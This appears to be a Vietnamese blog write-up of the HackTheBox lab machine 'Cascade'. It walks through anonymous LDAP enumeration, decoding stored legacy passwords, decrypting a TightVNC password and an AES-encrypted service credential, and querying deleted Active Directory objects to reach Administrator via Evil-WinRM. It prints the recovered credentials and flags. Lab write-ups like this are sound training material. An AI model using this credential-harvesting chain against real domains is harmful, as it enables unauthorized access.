![](https://images.viblo.asia/a1eb482a-a177-4c69-864f-844be6b8516b.png)

Cascade là bài thứ mấy mình chơi với machine Windows trên hackthebox cũng không nhớ nữa, chỉ nhớ là bài này mình làm vào đúng tối sinh nhật năm nay của mình. Là một bài khá hay với LDAP, mình đã học hỏi được rất nhiều thứ từ bài này. Nhìn lượt vote cũng thấy được bài này chủ yếu sử dụng kỹ thuật Enumeration. Hi vọng writeup này giúp ích gì được cho các bạn đọc bài này :P.

## Recon
Sử dụng enum4linux thì list ra được 1 danh sách người dùng
```powershell
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```
Tuy nhiên mình đang tập trung chủ yếu vào Group này vì thấy nó lạ lạ, có linh cảm cần phải tấn công vào đây.
```
Group 'AD Recycle Bin' (RID: 1119) has member: CASCADE\arksvc
```
Loay hoay 1 hồi nhưng chẳng phát hiện được gì tại đây cả.

Mình thử khá nhiều trường hợp, lấy ra 1 list user rồi cho vào `GetNPUser.py` cũng không dump được hash passwd nào
```powershell
➜  Cascade sudo GetNPUsers.py cascade.local/ -usersfile user -format john
Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

Đến đây thì thực sự bế tắc, lang thang trên mạng một hồi thì mình tìm thấy ở đây kiểm tra kết nối LDAP từ phía client
https://serverfault.com/questions/452935/how-to-test-a-ldap-connection-from-a-client

```sh
➜  Cascade ldapsearch -x -b "dc=cascade, dc=local" -h 10.10.10.182 > ldapsearch.txt
```
Do danh sách quá dài nên mình lưu vào file `ldapsearch.txt` để xem
```sh
➜  Cascade cat ldapsearch.txt| grep "Pwd"
maxPwdAge: -9223372036854775808
minPwdAge: 0
minPwdLength: 5
badPwdCount: 0
maxPwdAge: -37108517437440
minPwdAge: 0
minPwdLength: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
badPwdCount: 0
cascadeLegacyPwd: clk0bjVldmE=
```
Ở đây mình nhận được 1 đoạn string `cascadeLegacyPwd: clk0bjVldmE=` có lẽ là passwd cũ hoặc passwd mặc định, sử dụng passwd này thử với tất cả user bên trên xem đăng nhập được với user nào không, đầu tiên phải decode passwd ra trước đã
```sh
➜  Cascade echo -n clk0bjVldmE= | base64 -d
rY4n5eva
```
Đầu tiên mình thử với `Evil-WinRM` nhưng mà k hoạt động, sau đó mình thử với smb thì được 1 tài khoản `r.thompson`
```sh
➜  Cascade sudo smbclient.py r.thompson:rY4n5eva@10.10.10.182
Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation

Type help for list of commands
# shares
ADMIN$
Audit$
C$
Data
IPC$
NETLOGON
print$
SYSVOL
```

Sau khi khám phá toàn bộ nội dung được shares trên smb, mình lấy được file `Meeting_Notes_June_2018.html` 
```html
<p>For anyone that missed yesterdays meeting (Im looking at
you Ben). Main points are below:</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the Best GPO competition will be
announced on Friday so get your submissions in soon.</p>
```
Và 1 file `VNC Install.reg` ở `\IT\Temp\s.smith`
```sh
➜  Cascade cat VNC\ Install.reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
```
Chúng ta có thể thấy được đoạn 
```sh
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```
Tuy nhiên đoạn hex passwd này được sử dụng với phần mềm TightVNC để lấy ra được passwd chính. Có thể sử dụng script ở đây https://github.com/trinitronx/vncpasswd.py hoặc sử dụng chương trình `vncpwd` download cho Windows tại đây http://aluigi.altervista.org/pwdrec/vncpwd.zip

Ở đây mình đang chạy windows nên chọn `vncpwd` chạy luôn cho lẹ

![](https://images.viblo.asia/3ff339b8-9236-4283-be93-61dd13dbc677.png)


Passwd là `sT333ve2`   
Do file này được lấy từ người dùng `s.smith` nên mình đã thử luôn passwd này với user này luôn với `Evil-WinRM`
Và chúng ta có user
```powershell
➜  Cascade evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> ls
*Evil-WinRM* PS C:\Users\s.smith\Documents> cd ..
*Evil-WinRM* PS C:\Users\s.smith> cd Desktop
*Evil-WinRM* PS C:\Users\s.smith\Desktop> ls


    Directory: C:\Users\s.smith\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/8/2020   4:07 PM             34 user.txt
-a----        3/25/2020  11:17 AM           1031 WinDirStat.lnk


*Evil-WinRM* PS C:\Users\s.smith\Desktop> cat user.txt
77d989cc96e4ab408eb522047a5ebe8c
```
## Get Root
Thử tìm kiếm xung quanh nhưng không phát hiện ra được gì nhiều, thử đăng nhập tài khoản s.smith với dịch vụ SMB xem có đang được chia sẻ dữ liệu gì không.

```sh
➜  ~ sudo smbclient.py s.smith:sT333ve2@10.10.10.182
Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation
Type help for list of commands
# shares
ADMIN$
Audit$
C$
Data
IPC$
NETLOGON
print$
SYSVOL
# use Audit$
# ls
drw-rw-rw-          0  Thu Jan 30 01:01:26 2020 .
drw-rw-rw-          0  Thu Jan 30 01:01:26 2020 ..
-rw-rw-rw-      13312  Wed Jan 29 04:47:08 2020 CascAudit.exe
-rw-rw-rw-      12288  Thu Jan 30 01:01:26 2020 CascCrypto.dll
drw-rw-rw-          0  Wed Jan 29 04:43:18 2020 DB
-rw-rw-rw-         45  Wed Jan 29 06:29:47 2020 RunAudit.bat
-rw-rw-rw-     363520  Wed Jan 29 03:42:18 2020 System.Data.SQLite.dll
-rw-rw-rw-     186880  Wed Jan 29 03:42:18 2020 System.Data.SQLite.EF6.dll
drw-rw-rw-          0  Wed Jan 29 03:42:18 2020 x64
drw-rw-rw-          0  Wed Jan 29 03:42:18 2020 x86
```
Chúng ta lấy được chương trình `CaseAudit.exe` và thư viện `CascCrypto.dll` dùng để mã hoá. Trong thư mục DB cũng lấy được 1 file db sqlite3.

Nội dung file db
```sh
➜  Cascade sqlite3 Audit.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .table
DeletedUserAudit  Ldap              Misc
sqlite> select * from DeletedUserAudit
   ...> ;
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local
9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local
sqlite> select * from Ldap;
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
sqlite> select * from Misc;
sqlite>
```
Chúng ta lấy được 1 đoạn encrypt bằng base64. Tuy nhiên sau khi giải mã thì dường như đoạn mã hoá này phải thêm 1 bước giải mã nữa. Thực hiện decompile `CaseAudit.exe` và `CaseCrypto.dll` bằng dotPeek để xem chương trình thực hiện mã hoá và giải mã như nào.

File CaseCrypto.dll

![](https://images.viblo.asia/5abe1466-94a9-487c-b474-71dfec2c5a8e.png)


Thực hiện giải mã với AES 128 bit, sử dụng mode CBC, khoá `IV = 1tdyjCbY1Ix49842`

Tiếp tục biên dịch file CaseAudit.exe

![](https://images.viblo.asia/db160e36-b05b-4683-816e-6f96ec9706bf.png)


Đoạn code sẽ truy vấn vào bảng LDAP trong CSDL rồi thực hiện encrypt  với `key=c4scadek3y654321`. Sử dụng key và IV để giải mã.

![](https://images.viblo.asia/06d389c3-cb87-4425-a3a1-efb05d38be21.png)


Ở đây mình sử dụng CyberChef để giải mã [Decrypt](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'UTF8','string':'c4scadek3y654321'%7D,%7B'option':'UTF8','string':'1tdyjCbY1Ix49842'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D)&input=QlFPNWw1S2o5TWRFclh4NlE2QUdPdyA9PQ)

Vậy ta thu được mật khẩu của user `ArkSvc:w3lc0meFr31nd` 

Thực hiện đăng nhập với Evil-WinRM và chúng ta có 

![](https://images.viblo.asia/31b5d14f-5390-4c64-9cc8-6361a4916876.png)

![](https://images.viblo.asia/52dad3ec-3168-425c-8f71-4e20e53de850.png)


Kiểm tra 1 chủ thấy người dùng Arksvc thuộc Group AD Recycle Bin

Sử dụng winPEAS.exe cũng không thu được kết quả gì, do mình thuộc Group AD Recycle Bin, nên mình có thể tìm kiếm được đã có những Account nào đã bị xoá.

[https://social.technet.microsoft.com/Forums/en-US/5424e204-d601-4330-a7ed-331134e47e18/filter-deleted-users-in-getadobject-cmdlet-also-returns-deleted-computers?forum=ITCG](https://social.technet.microsoft.com/Forums/en-US/5424e204-d601-4330-a7ed-331134e47e18/filter-deleted-users-in-getadobject-cmdlet-also-returns-deleted-computers?forum=ITCG)

Sau khi googling thì tìm được đoạn code như sau
```powershell
*Evil-WinRM* PS C:\Users\arksvc\Documents> get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```

Vậy là chúng ta có user TempAdmin đã bị xoá, vậy có thể khôi phục lại tài khoản này và lên được admin hay không.

![](https://images.viblo.asia/7fae18bc-80a8-464f-b5e9-913635718896.png)


Nhưng user này lại k có quyền khôi phục lại account TempAdmin.

Tuy nhiên chúng ta có thể xem được Properties của account

```powershell
*Evil-WinRM* PS C:\Users\arksvc\Documents> get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
```
Lại 1 lần nữa thấy sự xuất hiện của `cascadeLegacyPwd`
```sh
➜  Cascade echo -n YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```

Thử đăng nhập với tài khoản Administrator với mật khẩu trên 
```powershell
➜  Cascade evil-winrm -u Administrator -p baCT3r1aN00dles -i 10.10.10.182

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
0ec81c0ccc6c0b0923b9db5e97dde189
```